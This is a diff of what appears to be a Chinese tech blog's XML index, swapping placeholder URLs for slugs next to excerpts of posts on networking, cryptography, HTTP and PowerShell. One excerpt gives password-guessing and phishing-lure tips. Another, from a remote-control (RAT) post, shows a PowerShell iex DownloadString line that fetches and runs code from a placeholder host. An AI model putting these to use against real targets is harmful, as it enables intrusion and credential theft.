@@ -4,7 +4,7 @@
     
     <entry>
       <title><![CDATA[两个局域网怎么互连？一个简单解决方案]]></title>
-      <url>/undefined-title/</url>
+      <url>/How-to-connect-two-lans/</url>
       <content type="html"><![CDATA[<p>背景故事这样的：工作室有两条宽带，一条用于同学们日常使用，另一条留给四台服务器专用，两个宽带分别用两个路由器做出口。</p>
 <p>现在有几个同学想要远程连服务器，但不在一个内网很麻烦，如果都放在同一个网络，又不希望服务器专用网络的带宽被占用。</p>
 <p>所以，问题就成了A, B两个局域网怎么在保证wlan出口不变的情况下，让A局域网内的部分机器能直接访问B局域网内的机器。<br><a id="more"></a></p>
@@ -37,7 +37,7 @@
     
     <entry>
       <title><![CDATA[梁山神算子算天机 江州黄通判通地孤]]></title>
-      <url>/undefined-title/</url>
+      <url>/entertain-cryptography/</url>
       <content type="html"><![CDATA[<p>话说当年宋江在江州浔阳楼题了反诗，被江州知府蔡九关押在死牢。蔡九依黄文炳之计，写家书给父亲蔡京，以炫耀“抓获反贼”之功，并让蔡京指点如何处置宋江。</p>
 <p>岂料戴宗中途被朱贵药酒迷倒，被同家书一并递与梁山。晁天王听完宋江在牢中心急火燎，定是要带着头领们打入死牢解救宋江，军师吴用却阻拦道：哥哥莫急，此事不可力敌，只能智取—— 我等将计就计，写一封假回书，让戴院长带回去，书上只说教把犯人宋江解赴东京再处决示众，待他来此间经过我们夺了便是。<br><a id="more"></a><br>晁盖道：好是好，只是没人会蔡京笔迹，又没蔡京图章。吴用说有圣手书生萧让可写蔡京字迹，玉臂匠金大坚可刻图章。诸位好汉无不称妙之时，忽闻一声且慢，原来是神算子蒋敬，蒋敬上前道：军师且慢，请细看此家书封底。</p>
 <p>众人凑近细看，发现有两行蝇头小字，上书“七四八六九零八八七二三一九三”，下书“四六七三二九七五三”。</p>
@@ -83,7 +83,7 @@
     
     <entry>
       <title><![CDATA[常见加密算法简介]]></title>
-      <url>/undefined-title/</url>
+      <url>/common-encryption-algorithm-introduction/</url>
       <content type="html"><![CDATA[<h2 id="一、对称加密_对称密钥（Symmetric-key_cryptography）">一、对称加密 对称密钥（Symmetric-key cryptography）</h2><hr>
 <h3 id="概述">概述</h3><p>对称加密是指加解密用同一个密钥的算法，根据具体实现分为流加密和分组加密两种类型：</p>
 <ul>
@@ -167,7 +167,7 @@
     
     <entry>
       <title><![CDATA[Apache2自签发V3证书详细流程]]></title>
-      <url>/undefined-title/</url>
+      <url>/Apache2-sign-certification/</url>
       <content type="html"><![CDATA[<h2 id="1-_生成自建CA_Root">1. 生成自建CA Root</h2><h3 id="什么是CA">什么是CA</h3><p>CA,Catificate Authority，数字证书认证中心，用于签发证书，保证客户端之间服务端的信任。CA实际上是在做key和cert的pair。<br>常见的Symantec, Comodo等公司都是CA服务商。</p>
 <a id="more"></a>
 <h3 id="为什么要CA">为什么要CA</h3><p>不经过CA签证的证书之间挂到Apache上也能用，但浏览器肯定会报错ERR_CERT_AUTHORITY_INVALID，带着一个红叉，需要点强行访问来通过。使用这些公司签发的证书浏览器能自动识别，是因为浏览器已经内置了这些厂商的根证书。<br>我们自己做一个CA，一方面是可以去掉报错和红叉，另一方面也是为了实现双向认证模式。</p>
@@ -209,7 +209,7 @@ SSLCertificateKeyFile <span class="regexp">/etc/</span>apache2<span class="regex
     
     <entry>
       <title><![CDATA[详解HTTP细节 1]]></title>
-      <url>/undefined-title/</url>
+      <url>/Detailed-HTTP-protocol-1/</url>
       <content type="html"><![CDATA[<p>HTTP协议基于TCP/IP协议，属于无状态协议</p>
 <a id="more"></a>
 <h2 id="HTTP_0-9">HTTP 0.9</h2><p>样例：<br><code>GET 192.168.1.2/test.txt</code><br>GET开头，空格接着URL地址和查询字符串，CRLF换行结束，返回结果默认是HTML格式（如果不是服务器也没法通知），HTTP 0.9不支持一台服务器IP对应多个域名，属于已经过时的协议，<strong>但大部分浏览器仍然支持HTTP 0.9，这将导致一些安全问题</strong></p>
@@ -273,7 +273,7 @@ SSLCertificateKeyFile <span class="regexp">/etc/</span>apache2<span class="regex
     
     <entry>
       <title><![CDATA[详解URL细节]]></title>
-      <url>/undefined-title/</url>
+      <url>/Detailed-URL/</url>
       <content type="html"><![CDATA[<p>URL即Uniform Resource Locator，统一资源定位符，用来指定互联网上标准资源的地址。</p>
 <a id="more"></a>
 <h2 id="URL标准结构">URL标准结构</h2><blockquote>
@@ -365,7 +365,7 @@ SSLCertificateKeyFile <span class="regexp">/etc/</span>apache2<span class="regex
     
     <entry>
       <title><![CDATA[Some Tips]]></title>
-      <url>/undefined-title/</url>
+      <url>/some-tips/</url>
       <content type="html"><![CDATA[<ul>
 <li>超过100人的公司，用键盘走位密码跑一遍，总会有收获。</li>
 <li>Fishing内容：招聘——投递简历 科研——会议邀请 媒体——策划方案 销售——咨询产品 网站——错误反馈</li>
@@ -389,7 +389,7 @@ SSLCertificateKeyFile <span class="regexp">/etc/</span>apache2<span class="regex
     
     <entry>
       <title><![CDATA[PowerShell XML处理和注册表(Default)取值 坑两则]]></title>
-      <url>/undefined-title/</url>
+      <url>/powershell-xml-regedit/</url>
       <content type="html"><![CDATA[<ol>
 <li>处理XML时，PowerShell支持直接以对象的方式访问节点，像这样</li>
 </ol>
@@ -423,7 +423,7 @@ SSLCertificateKeyFile <span class="regexp">/etc/</span>apache2<span class="regex
     
     <entry>
       <title><![CDATA[PowerShell 判断操作系统语言]]></title>
-      <url>/undefined-title/</url>
+      <url>/powershell-check-system-language/</url>
       <content type="html"><![CDATA[<p>###用PowerShell判断系统语言的的几种方法：</p>
 <ol>
 <li>systeminfo.exe<br>最简单的方法，但是数据不好进一步处理，而且速度慢</li>
@@ -471,7 +471,7 @@ SSLCertificateKeyFile <span class="regexp">/etc/</span>apache2<span class="regex
     
     <entry>
       <title><![CDATA[PowerShell学习资料整理]]></title>
-      <url>/undefined-title/</url>
+      <url>/powershell-learning-materials/</url>
       <content type="html"><![CDATA[<p>这篇博文会长期更新，整理一些PowerShell、PowerShell安全相关的网站和学习资料。<br><a id="more"></a></p>
 <h2 id="基础资料：">基础资料：</h2><ul>
 <li><a href="https://msdn.microsoft.com/en-us/powershell" title="MSDN" target="_blank" rel="external">微软PowerShell官网</a></li>
@@ -530,7 +530,7 @@ SSLCertificateKeyFile <span class="regexp">/etc/</span>apache2<span class="regex
     
     <entry>
       <title><![CDATA[PowerShell入门系列2:cmdlet]]></title>
-      <url>/undefined-title/</url>
+      <url>/powershell-introduction-2/</url>
       <content type="html"><![CDATA[<h3 id="什么是cmdlet">什么是cmdlet</h3><ul>
 <li>PowerShell里可以执行<strong>内置的命令</strong>和用户定义的内容（函数、脚本、别名、过滤器），还有可执行程序。<br>其中<strong>内置的命令</strong>就叫做cmdlet，换个说法就是系统命令，也是继续学习PowerShell的基础。</li>
 <li>cmdlet的特殊之处在于，每一个cmdlet都是一个.net object，运行于PowerShell进程里。</li>
@@ -640,7 +640,7 @@ Command *”获取所有 Windows PowerShell 元素以及 <span class="keyword">P
     
     <entry>
       <title><![CDATA[Skill List]]></title>
-      <url>/undefined-title/</url>
+      <url>/skill-list/</url>
       <content type="html"><![CDATA[<h3 id="2016年前该读完">2016年前该读完</h3><ul>
 <li>《Javascript高级编程》</li>
 <li>《Python灰帽子编程》</li>
@@ -677,7 +677,7 @@ Command *”获取所有 Windows PowerShell 元素以及 <span class="keyword">P
     
     <entry>
       <title><![CDATA[PowerShell入门系列1：介绍和快速开始]]></title>
-      <url>/undefined-title/</url>
+      <url>/powershell-introduction-2/</url>
       <content type="html"><![CDATA[<h2 id="PowerShell简介">PowerShell简介</h2><h3 id="PowerShell是什么？">PowerShell是什么？</h3><p>PowerShell 是运行在windows机器上实现系统和应用程序管理自动化的命令行脚本环境。<br>相比Linux里的shell，Windows自带的cmd命令提示符显得有些简陋，所以从Windows 7之后微软提供了cmd的超级升级版——PowerShell。</p>
 <a id="more"></a>
 <h3 id="怎么安装PowerShell？">怎么安装PowerShell？</h3><p>大部分情况下是不需要安装的</p>
@@ -739,7 +739,7 @@ hello world
     
     <entry>
       <title><![CDATA[深入理解JS笔记 1：数据类型Tips]]></title>
-      <url>/undefined-title/</url>
+      <url>/deep-learn-javascript-reading-notes-1/</url>
       <content type="html"><![CDATA[<p>备注：为了方便阅读《Javascript高级程序设计》 以下简称为 《J高》，笔记会引用很多该书内容，同时非常感谢笨蛋的座右铭的《理解Javascript》一系列文章。</p>
 <h2 id="引用数据类型和原始数据类型">引用数据类型和原始数据类型</h2><ul>
 <li>ECMA-262 把类型（type）定义为值的集合，每种原始类型定义了包含它的值的范围及其字面量表示形式</li>
@@ -790,7 +790,7 @@ hello world
     
     <entry>
       <title><![CDATA[Python+PowerShell 一句话远控脚本思路]]></title>
-      <url>/undefined-title/</url>
+      <url>/python-powershell-rat/</url>
       <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>从Win7开始，Windows全部自带极其强大的Powershell，Windows的新利器！我之后会陆续写一些关于Powershell应用的文章。</p>
 <p>这是用Python写服务端，PowerShell写客户端，基于Socket的一个远控脚本。<br>其实Powershell也可以写服务端，选Python写服务端主要是为了在Linux服务器上也能跑。<br><a id="more"></a></p>
 <h2 id="原理">原理</h2><p><code>iex (New-Object Sys.Net.Webclient).DownloadString(&quot;http://IP:Port/connect&quot;)</code> </p>
